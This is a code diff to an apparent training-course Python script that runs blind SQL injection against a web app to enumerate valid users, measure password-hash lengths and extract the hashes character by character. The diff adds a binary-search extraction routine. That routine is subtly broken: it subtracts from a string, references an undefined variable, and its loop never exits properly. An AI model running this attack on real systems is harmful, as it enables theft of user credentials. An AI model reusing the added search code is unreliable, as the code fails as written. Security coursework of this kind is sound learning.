@@ -1,5 +1,5 @@
 # This script launches a blind SQL injection attack against a vulnerable user-defined web app to determine what user(s) are valid,
-# find the length of their passwords as well as extract their password hashes from the SQL DB
+# find the length of their passwords as well as extract their password hashes from the SQL DB using binary search logic
 # Logic is adapted from the TCM Python 101 for Hackers course: https://academy.tcm-sec.com/p/python-101-for-hackers 
 
 import requests
@@ -69,10 +69,43 @@ def extractPasswordHash(charset, userID, passwordLength):
 				break
 	return found
 
+# Function accepts a charset, userID and password length to create an SQL query to determine if a character guessed matches
+# the character at index I of the user's password hash; uses binary search tree logic to limit the number of SQL queries needed
+# Purpose: Building a user's password hash one character at a time
+def extractPasswordHashBinarySearch(charset, userID, passwordLength):
+	found = ""
+	for i in range(0, passwordLength):
+		# Set the initial min and max values of the character (0 and f)
+		start = 0
+		end = (len(charset - 1))
+
+		# While there is still a 'middle' value to be compared against
+		while start <= end:
+			# If there search space has been exhausted (no middle value to compare against) then perform one 
+			# final check to see if the character is the value of charset[start]
+			if end - start == 1: 
+				if start == 0 and booleanQuery(index, userID, charset[start]):
+					found += charset[start]
+				else:
+					found += charset[start+1]
+			# Find and assign the next middle value for the next comparison, determining if the character
+			# is either greater than or less than the new middle value
+			else:
+				middle = (start + end) // 2
+				# If the character is less than the middle, reassign the end value
+				# If the character is greater than the middle, reassign the start value
+				if booleanQuery(index, userID, charset[middle]):
+					end = middle
+				else:
+					start = middle
+
+	return found
+
 # Function prints the value of the global totalQueries variable
 def totalQueriesMade():
 	global totalQueries
 	print("\t[*] {} total SQL queries made.".format(totalQueries))
+	totalQueries = 0 # Reset the counter after running the function
 
 # Infinite loop for user to interact with script
 while True:
@@ -85,7 +118,12 @@ while True:
 		if not invalidUser(userID):
 			userPasswordLength = passwordLength(userID)
 			print("User {}'s password has a hash length of {}".format(userID, userPasswordLength))
+
+			# Extract the user's password hash by doing both single charaacter comparisons and using binary search logic to
+			# see the difference of SQL queries needed for both methods
 			print("User {}'s password hash is: {}".format(userID, extractPasswordHash(charset, int(userID), userPasswordLength)))
+			totalQueriesMade()
+			print("User {}'s password hash is: {}".format(userID, extractPasswordHashBinarySearch(charset, int(userID), userPasswordLength)))
 			totalQueriesMade()
 		else:
 			print("User {} does not exist. Please try again.".format(userID))
